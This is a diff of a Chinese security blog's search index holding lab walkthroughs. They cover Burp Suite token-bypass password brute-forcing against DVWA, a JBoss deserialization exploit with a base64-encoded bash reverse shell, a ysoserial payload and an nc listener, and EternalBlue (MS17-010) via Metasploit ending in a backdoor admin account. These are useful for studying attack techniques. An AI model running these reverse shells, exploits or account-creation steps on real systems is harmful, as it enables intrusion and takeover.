@@ -1,6 +1,67 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Burpsuite绕过Token爆破</title>
+    <url>/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
+<p>环境：</p>
+<p>DVWA + Burpsuite Pro</p>
+<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
+<p>2、进行如下配置</p>
+<p>Position模块</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164115625.png" alt="image-20210809164115625" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164115625.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>
+
+
+
+<p>Paloads模块 – 1</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164127222.png" alt="image-20210809164127222" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164127222.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>
+
+<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
+<p>Resource Pool模块</p>
+<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164239466.png" alt="image-20210809164239466" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164239466.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>
+
+<p>Option模块</p>
+<p>选择Grep Extract模块</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164250278.png" alt="image-20210809164250278" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164250278.png" class="lozad post-image"></p>
+<p>点击Add，依次填写</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164302558.png" alt="image-20210809164302558" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164302558.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>
+
+
+
+<p>Redirections模块</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164312043.png" alt="image-20210809164312043" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164312043.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>
+
+
+
+<p>最后，回到Payloads模块</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164328050.png" alt="image-20210809164328050" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164328050.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>
+
+<p>3、结果</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164338459.png" alt="image-20210809164338459" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164338459.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>
+
+
+
+<p>按照长度排序（状态码相同，无法参考）</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164352072.png" alt="image-20210809164352072" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164352072.png" class="lozad post-image"></p>
+<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
+<p>至此，token绕过爆破攻击结束。</p>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>绕过Token爆破</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Access注入</title>
     <url>/article/Access%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>端口：无</p>
@@ -86,67 +147,6 @@
       </categories>
       <tags>
         <tag>BurpSuite代理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Burpsuite绕过Token爆破</title>
-    <url>/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
-<p>环境：</p>
-<p>DVWA + Burpsuite Pro</p>
-<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
-<p>2、进行如下配置</p>
-<p>Position模块</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164115625.png" alt="image-20210809164115625" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164115625.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>
-
-
-
-<p>Paloads模块 – 1</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164127222.png" alt="image-20210809164127222" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164127222.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>
-
-<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
-<p>Resource Pool模块</p>
-<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164239466.png" alt="image-20210809164239466" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164239466.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>
-
-<p>Option模块</p>
-<p>选择Grep Extract模块</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164250278.png" alt="image-20210809164250278" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164250278.png" class="lozad post-image"></p>
-<p>点击Add，依次填写</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164302558.png" alt="image-20210809164302558" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164302558.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>
-
-
-
-<p>Redirections模块</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164312043.png" alt="image-20210809164312043" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164312043.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>
-
-
-
-<p>最后，回到Payloads模块</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164328050.png" alt="image-20210809164328050" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164328050.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>
-
-<p>3、结果</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164338459.png" alt="image-20210809164338459" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164338459.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>
-
-
-
-<p>按照长度排序（状态码相同，无法参考）</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164352072.png" alt="image-20210809164352072" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164352072.png" class="lozad post-image"></p>
-<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
-<p>至此，token绕过爆破攻击结束。</p>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>绕过Token爆破</tag>
       </tags>
   </entry>
   <entry>
@@ -496,6 +496,38 @@
       <tags>
         <tag>HTML</tag>
         <tag>CSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JBoss反序列化漏洞复现</title>
+    <url>/article/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
+<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
+<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
+<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
+<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
+<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
+<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
+<p>攻击机：192.168.66.138</p>
+<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
+
+<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)</a></p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
+
+<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>
+
+<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
+<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>
+
+<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>
+
+<p>注：poc版本&gt;=5</p>
+<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>JBoss</tag>
       </tags>
   </entry>
   <entry>
@@ -1410,38 +1442,6 @@
       </tags>
   </entry>
   <entry>
-    <title>JBoss反序列化漏洞复现</title>
-    <url>/article/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
-<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
-<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
-<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
-<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
-<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
-<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
-<p>攻击机：192.168.66.138</p>
-<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
-
-<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)</a></p>
-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
-
-<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>
-
-<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
-<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>
-
-<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>
-
-<p>注：poc版本&gt;=5</p>
-<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>JBoss</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JavaScript基础</title>
     <url>/article/JavaScript%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="js调用方法（4种）"><a href="#js调用方法（4种）" class="headerlink" title="js调用方法（4种）"></a>js调用方法（4种）</h1><table>
@@ -2000,6 +2000,66 @@
       </tags>
   </entry>
   <entry>
+    <title>MS17-010漏洞复现</title>
+    <url>/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<h1 id="二、探测"><a href="#二、探测" class="headerlink" title="二、探测"></a>二、探测</h1><p>靶机：win7 x64 sp1 IP：192.168.66.98<br>攻击机：kali 2020.4 IP：192.168.66.138</p>
+<h2 id="1、通过nmap扫描目标机器，发现139、445端口"><a href="#1、通过nmap扫描目标机器，发现139、445端口" class="headerlink" title="1、通过nmap扫描目标机器，发现139、445端口"></a>1、通过nmap扫描目标机器，发现139、445端口</h2><pre class="highlight"><span class="line">nmap -V -T4 192.168.66.98   </span><br><span class="line">#T4设置扫描速度，越高越快（1-5）</span><br><span class="line">#-V显示详情</span><br></pre>
+
+<p>结果：</p>
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" alt="image-20210809161636575" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" class="lozad post-image"></p>
+<h2 id="2、使用msf探测是否存在MS17-010漏洞"><a href="#2、使用msf探测是否存在MS17-010漏洞" class="headerlink" title="2、使用msf探测是否存在MS17-010漏洞"></a>2、使用msf探测是否存在MS17-010漏洞</h2><p>a、寻找MS17-010模块</p>
+<pre class="highlight"><span class="line">search MS17-010</span><br></pre>
+
+<p>发现2个探测模块和4个利用模块</p>
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" alt="image-20210809161651064" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" class="lozad post-image"></p>
+<h2 id="3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测"><a href="#3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测" class="headerlink" title="3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测"></a>3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测</h2><pre class="highlight"><span class="line">use auxiliary/scanner/smb/smb_ms17_010   	#调用探测模块</span><br><span class="line">show options                 				#显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98          			#设置目标IP</span><br><span class="line">run                     					#运行探测程序</span><br></pre>
+
+<p>探测出存在MS17-010漏洞</p>
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" alt="image-20210809161701790" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" class="lozad post-image"></p>
+<h1 id="三、利用"><a href="#三、利用" class="headerlink" title="三、利用"></a>三、利用</h1><h2 id="1、使用攻击模块对靶机发起攻击"><a href="#1、使用攻击模块对靶机发起攻击" class="headerlink" title="1、使用攻击模块对靶机发起攻击"></a>1、使用攻击模块对靶机发起攻击</h2><pre class="highlight"><span class="line">use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块</span><br><span class="line">show options                                    #显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98                        #设置目标IP</span><br><span class="line">run                                             #运行探测程序</span><br></pre>
+
+<p>攻击成功，进入后渗透攻击阶段</p>
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" alt="image-20210809161712134" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" class="lozad post-image"></p>
+<h2 id="2、靶机信息收集"><a href="#2、靶机信息收集" class="headerlink" title="2、靶机信息收集"></a>2、靶机信息收集</h2><p>a、查看目标主机详细信息</p>
+<pre class="highlight"><span class="line">sysinfo</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" alt="image-20210809161720244" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" class="lozad post-image"></p>
+<p>b、查看当前获取的权限</p>
+<pre class="highlight"><span class="line">getuid</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" alt="image-20210809161730216" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" class="lozad post-image"></p>
+<p>system权限，无需提权</p>
+<h2 id="3、开启远程桌面"><a href="#3、开启远程桌面" class="headerlink" title="3、开启远程桌面"></a>3、开启远程桌面</h2><pre class="highlight"><span class="line">run getgui -e</span><br></pre>
+
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" alt="image-20210809161744651" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" class="lozad post-image"></p>
+<p>成功开启远程桌面</p>
+<h2 id="4、切换到cmd命令行模式"><a href="#4、切换到cmd命令行模式" class="headerlink" title="4、切换到cmd命令行模式"></a>4、切换到cmd命令行模式</h2><pre class="highlight"><span class="line">shell</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" alt="image-20210809161756295" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" class="lozad post-image"></p>
+<h2 id="5、添加用户"><a href="#5、添加用户" class="headerlink" title="5、添加用户"></a>5、添加用户</h2><pre class="highlight"><span class="line">net user  </span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" alt="image-20210809161805432" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">net user hacker hacker.123 /add        #添加用户、密码</span><br><span class="line"></span><br><span class="line">net localgroup administrators hacker /add  #提权至管理员组</span><br><span class="line"></span><br><span class="line">net localgroup administrators        #查看管理员组成员</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" alt="image-20210809161814628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" class="lozad post-image"></p>
+<p>提权成功</p>
+<h2 id="6、开启远程桌面连接"><a href="#6、开启远程桌面连接" class="headerlink" title="6、开启远程桌面连接"></a>6、开启远程桌面连接</h2><p>a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接</p>
